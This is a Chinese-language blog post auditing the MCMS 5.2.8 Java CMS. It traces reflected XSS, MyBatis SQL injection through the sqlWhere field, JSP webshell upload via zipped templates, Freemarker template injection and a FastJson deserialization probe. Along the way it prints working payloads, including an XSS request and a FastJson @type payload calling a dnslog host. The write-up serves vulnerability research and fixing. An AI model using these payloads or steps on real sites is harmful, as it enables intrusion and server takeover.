Java代码审计其一：MCMS 5.2.8

[A_L1ar](https://www.freebuf.com/author/A_L1ar)2023-03-17 11:06:40237407

 所属地 山东省

## 简介

第一篇Java代码审计文章，有不足之处还请指正。

MCMS 的代码比价简明易懂，作为审计的第一篇比较合适。

MCMS 5.2.8是使用springboot+mybatis开发的CMS，已知漏洞主要是SQL注入、文件上传、SSTI，在最新版已经得到修复。

本文主要体现思路，有些地方可能不够详细。

## XSS

思路：前台就一个搜索框，插入XSS代码试试

### 复现

反射型： 前台搜索框，虽然有过滤阻断了search.do并 提示：参数异常；但将异常参数拼接到了报错页面。

```
POST //mcms/search.do HTTP/1.1
content_title=<script>alert('/xss/')</script>
```

![1679015628_6413becc853cac9801479.png!small?1679015622806](https://image.3001.net/images/20230317/1679015628_6413becc853cac9801479.png!small?1679015622806)

### 源码

```
net/mingsoft/basic/filter/XssHttpServletRequestWrapper.java
```

`throw new BusinessException("参数异常:"+ content);`此处直接将content原样拼接到报错中

```
public String clean(String name, String content) {
   String result = Jsoup.clean(content, "", whitelist, outputSettings);
   // 转义回来,防止&被转义导致结果误差
   result = Parser.unescapeEntities(result, true);
   if (!content.equals(result) || !SqlInjectionUtil.isSqlValid(content)){
      String uri = SpringUtil.getRequest().getRequestURI();
      LOGGER.debug("接口不符合XSS规则:{}",uri);
      LOGGER.debug("参数名:{} 参数值:{}", name,content);
      throw new BusinessException("参数异常:"+ content);
   }
   return content;
}
```

## SQL注入

思路：MCMS是使用mybaits作为持久层框架的，当在与接口对应的xml文件中使用 ${String} 时，会将String拼接进SQL语句。还有 <include></include>标签，会将一段复用的SQL代码拼接入当前语句中。

从这个思路出发，有两类注入，第一种造成的注入多，第二种需要官方的编辑器（因需要注册，不做记录，给出链接https://gitee.com/mingSoft/MCMS/issues/I61P5X）



知识点：mybatis的xml有对应java代码interface，xml中的id对应interface中的方法

![1679017375_6413c59f417a1c6c4fdfe.png!small](https://image.3001.net/images/20230317/1679017375_6413c59f417a1c6c4fdfe.png!small)

先给出明确的脉络，方便之后跟进不少的代码

从xml->interface->impl(实现)->Controller->抓包构造



### 1. XML找 ${



ICategoryDao.xml、ICmsHistoryLogDao.xml、IContentDao.xml都存在`<include refid="net.mingsoft.base.dao.IBaseDao.sqlWhere"></include>`，id都为query

例如ICategoryDao.xml

```
<!--条件查询-->
	<select id="query" resultMap="resultMap">
		select * from cms_category
		<where>
			<if test="categoryTitle != null and categoryTitle != ''"> and category_title=#{categoryTitle}</if>
			......
			<if test="leaf != null"> and leaf=#{leaf}</if>
			<include refid="net.mingsoft.base.dao.IBaseDao.sqlWhere"></include>
		</where>
	</select>
```

跟进include中的net.mingsoft.base.dao.IBaseDao.sqlWhere，文件为`net/mingsoft/base/dao/IBaseDao.xml`

在jar包中

这里需要注意：

- `${item.field}`被直接拼接在SQL语句中

- `${item.field}`，item是collection="sqlWhereList"的别名，也就是`${sqlWhereList.field}```

- 传递的参数sqlWhereList，需要构造的是其中的

  ```
  field
  ```

  ```
  <sql id="sqlWhere" databaseId="mysql">
          <if test="sqlWhereList != null">
          <foreach collection="sqlWhereList" item="item" index="index"
                   open="and( " separator=" " close=" )">
  
              <if test="item.el == 'eq'">
                  <choose>
                      <when test="item.multiple != null and item.multiple == true">
                          FIND_IN_SET(#{item.value}, ${item.field})>0
                      </when>
                      <otherwise>
                          ${item.field} = #{item.value}
                      </otherwise>
                  </choose>
              </if>
              ......//下面还用其他的if语句，节省篇幅，不多贴代码
  ```

### 2. 找接口及其实现



思路回到ICategoryDao.xml，找select id="query"对应的接口

```
@Component("cmsCategoryDao")
public interface ICategoryDao extends IBaseDao<CategoryEntity> {

    /**
     * 查询当前分类下面的所有子分类
     * @param category 必须存在categoryId categoryParentId
     * @return
     */
    public List<CategoryEntity> queryChildren(CategoryEntity category);

}
```

没有query，去父接口IBaseDao，注意是List类型

```
public interface IBaseDao<E> extends BaseMapper<E> {
	...
    	List<E> query(BaseEntity entity);
    ...
}
```

找实现query的类，有三个，但只有一个接收传参

`net/mingsoft/base/biz/impl/BaseBizImpl.java`
``

```
public abstract class BaseBizImpl<M extends BaseMapper<T>,T> extends ServiceImpl<M,T> implements IBaseBiz<T> {
    ...
    	@Override
	public List<T> query(BaseEntity entity) {
		// TODO Auto-generated method stub
		return getDao().query(entity);
	}
	...
}
```

这是个抽象类，继续找，红线上为库中的，红线下为项目中的，先看项目中的

![1679018469_6413c9e5e4ecc85e8021f.png!small?1679018464359](https://image.3001.net/images/20230317/1679018469_6413c9e5e4ecc85e8021f.png!small?1679018464359)

以`net/mingsoft/cms/action/CategoryAction.java`为例，获得地址：url为`@RequestMapping("/${ms.manager.path}/cms/category")`，`${ms.manager.path}`在配置中为ms

```
@Api(tags={"后端-内容模块接口"})
@Controller("cmsCategoryAction")
@RequestMapping("/${ms.manager.path}/cms/category")
public class CategoryAction extends BaseAction {
    ......
	@RequestMapping(value="/list",method = {RequestMethod.GET, RequestMethod.POST})
	@ResponseBody
	@RequiresPermissions("cms:category:view")
	public ResultData list(@ModelAttribute @ApiIgnore CategoryEntity category) {
		BasicUtil.startPage();
		List categoryList = categoryBiz.query(category);
		return ResultData.build().success(new EUListBean(categoryList,(int) BasicUtil.endPage(categoryList).getTotal()));
	}
    ......
}
```

找到了query，categoryBiz.query；还没找到它的参数sqlWhereList，看看CategoryEntity，没有

```
public class CategoryEntity extends BaseEntity {}
```

看父类BaseEntity，找到sqlWhereList和SQLwhere，SQLwhere是`[{}]`形式，这里还看到一个眼熟的东西，JSONObject.parseArray，那么会不会有JSONObject.parse呢？

```
public abstract class  BaseEntity implements Serializable{
    ...
        
	/**
	 * 自定义SQL where条件，需要配合对应dao.xml使用
	 */
	@JsonIgnore
	@XmlTransient
	@TableField(exist = false)
	protected String sqlWhere;
    
    @JsonIgnore
	@XmlTransient
	public String getSqlWhere() {
		return sqlWhere;
	}
    public void setSqlWhere(String sqlWhere) {
		this.sqlWhere = sqlWhere;
	}
    
    @JsonIgnore
	@XmlTransient
	public List getSqlWhereList() {
		if(StringUtils.isNotBlank(sqlWhere)){
			try {
				return JSONObject.parseArray(sqlWhere,Map.class);
			}catch (Exception e){
				e.printStackTrace();
			}
		}
		return Collections.EMPTY_LIST;
	}
    ...
}
```



### 3. 该抓包了

去网站后台看看有没有构造查询条件的地方 ICategoryDao.xml、ICmsHistoryLogDao.xml、IContentDao.xml，这三个对应的是分类、日志、内容

sqlWhere指的是条件查询，就去后台找找条件查询的地方

![1679019912_6413cf886195cdc447cf5.png!small?1679019907018](https://image.3001.net/images/20230317/1679019912_6413cf886195cdc447cf5.png!small?1679019907018)

![1679019905_6413cf81cd9f133cae1c1.png!small?1679019900208](https://image.3001.net/images/20230317/1679019905_6413cf81cd9f133cae1c1.png!small?1679019900208)

![1679019940_6413cfa401ae6115f1993.png!small?1679019934706](https://image.3001.net/images/20230317/1679019940_6413cfa401ae6115f1993.png!small?1679019934706)

有sqlWhere，解码，找到field

```
[{"action":"and","field":"content_title","el":"eq","model":"contentTitle","name":"æç« æ é¢","type":"input","value":"aaaaaaaaaaaaa"}]
```



### 4. 构造

idea console有语句，没有也可监听MySQL的日志

```
net.mingsoft.cms.dao.IContentDao.query_COUNT:137 : ==>  Preparing: SELECT count(0) FROM (SELECT ct.*, cc.category_path FROM cms_content ct JOIN cms_category cc ON ct.category_id = cc.id WHERE ct.del = 0 AND (content_title = ?)) ct
net.mingsoft.cms.dao.IContentDao.query_COUNT:137 : ==> Parameters: aaaaaaaaaaaaa(String)
net.mingsoft.cms.dao.IContentDao.query_COUNT:137 : <==      Total: 1
SELECT count(0) FROM (SELECT ct.*, cc.category_path FROM cms_content ct JOIN cms_category cc ON ct.category_id = cc.id WHERE ct.del = 0 AND (content_title = aaaaaaaaaaaaa)) ct
```

直接用报错注入就好

![1679020160_6413d080017aea433124d.png!small?1679020154645](https://image.3001.net/images/20230317/1679020160_6413d080017aea433124d.png!small?1679020154645)



### 5. 测试其他

![1679020234_6413d0cab0778628dfdb1.png!small?1679020229396](https://image.3001.net/images/20230317/1679020234_6413d0cab0778628dfdb1.png!small?1679020229396)

红线以下，不放结果了，简单说下，方法为list，且参数为list基本可行，如CategoryAction.list、ConternAcion.List，CategoryAction与ConternAcion在前台有同名类，同名的list，但有xss过滤无法使用select

![1679020486_6413d1c6b2353085e3a13.png!small?1679020481390](https://image.3001.net/images/20230317/1679020486_6413d1c6b2353085e3a13.png!small?1679020481390)



红线以上，log.list、dict.list可以



### 6. 还有个方法

搜索`<include refid="net.mingsoft.base.dao.IBaseDao.sqlWhere"></include>`，要下载cms官方jar包的源码

![1679020716_6413d2ac11d349ae1f309.png!small?1679020710683](https://image.3001.net/images/20230317/1679020716_6413d2ac11d349ae1f309.png!small?1679020710683)

## 文件上传

### 模板位置上传

```
/ms/file/uploadTemplate.do
```

![1679020966_6413d3a63daf801a241c7.png!small](https://image.3001.net/images/20230317/1679020966_6413d3a63daf801a241c7.png!small)

打包jsp文件为zip，上传模板即可，前端时间监听，会发送解压请求

![1679021029_6413d3e56639c9ef33a17.png!small?1679021023760](https://image.3001.net/images/20230317/1679021029_6413d3e56639c9ef33a17.png!small?1679021023760)

如果使用Tomcat运行的项目，访问可getshell，`http://localhost:8888/template/1/xxx.jsp`代码没什么好看得，正常上传正常解压，没有检验删除，有删除可以试试条件竞争

### 图片位置上传

还有一处系统设置里的上传网站logo，也是上传zip，这里需要自己调用unZip

`/ms/file/upload.do`上传后会回显路径

```
/ms/template/unZip.do?fileUrl=zip路径
```



## SSTI：Freemarker模板注入

![1679021270_6413d4d6cf5956116f1d2.png!small?1679021266163](https://image.3001.net/images/20230317/1679021270_6413d4d6cf5956116f1d2.png!small?1679021266163)

自定义页面，绑定它，然后访问即可，没有进行安全配置

源码位置net\mingsoft\base\util\FtlUtil.java

如果加上cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);漏洞就可以修复，也可以试试Freemarker的include包含模板，可惜在win下没成功

## FastJson <=1.2.80 反序列化 存在但难以利用

### 复现

只能看看ip，爆下依赖

![1679021661_6413d65d08fc91f3b1a3c.png!small?1679021655743](https://image.3001.net/images/20230317/1679021661_6413d65d08fc91f3b1a3c.png!small?1679021655743)

post参数jsonConfig={"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"xxxxxxxx.dnslog.cn"}}}

### 源码

`net/mingsoft/basic/action/web/EditorAction.java`Map<String, Object> map = (Map<String, Object>) JSONObject.parse(jsonConfig); //直接解析了jsonConfig

URL：@RequestMapping("/static/plugins/ueditor/{version}/jsp")，需要version

```
/**
 * 百度编辑器上传
 *
 * @author 铭软开发团队
 * @date 2019年7月16日
 * 历史修订 2022-1-21 新增normalize(),
 * editor()方法过滤非法上传路径
 */
@ApiIgnore
@Controller("ueAction")
@RequestMapping("/static/plugins/ueditor/{version}/jsp")
public class EditorAction {

    @ResponseBody
    @RequestMapping(value = "editor", method = {RequestMethod.GET, RequestMethod.POST})
    public String editor(HttpServletRequest request, HttpServletResponse response, String jsonConfig) {
        String uploadFloderPath = MSProperties.upload.path;
        String rootPath = BasicUtil.getRealPath(uploadFloderPath);
        jsonConfig = jsonConfig.replace("{ms.upload}", "/" + uploadFloderPath);
        //过滤非法上传路径
        Map<String, Object> map = (Map<String, Object>) JSONObject.parse(jsonConfig);
        //直接解析了jsonConfig
```

`ms-basic-2.1.13.2.jar!\WEB-INF\manager\include\head-file.ftl`可以看到{version}版本1.4.3.3

```
//百度编辑器默认配置
ms.editorConfig={
    imageScaleEnabled :true,
    autoHeightEnabled: true,
    autoFloatEnabled: false,
    scaleEnabled: true,
    compressSide:0,
    maxImageSideLength:1000,
    maximumWords: 2000,
    initialFrameWidth: '100%',
    initialFrameHeight: 400,
    serverUrl: ms.base + "/static/plugins/ueditor/1.4.3.3/jsp/editor.do?jsonConfig=%7BvideoUrlPrefix:\'\',fileManagerListPath:\'\',imageMaxSize:204800000,videoMaxSize:204800000,fileMaxSize:204800000,fileUrlPrefix:\'\',imageUrlPrefix:\'\',imagePathFormat:\'/${appId}/cms/content/editor/%7Btime%7D\',filePathFormat:\'/${appId}/cms/content/editor/%7Btime%7D\',videoPathFormat:\'/${appId}/cms/content/editor/%7Btime%7D\'%7D",
    UEDITOR_HOME_URL: ms.base + '/static/plugins/ueditor/1.4.3.3/'
}
```

mcms5.3.0 换了json解析的依赖

## 总结

这些漏洞都比较好发现，只取决于是否知道对应的知识点。如果有遗漏的漏洞，还请多多指教。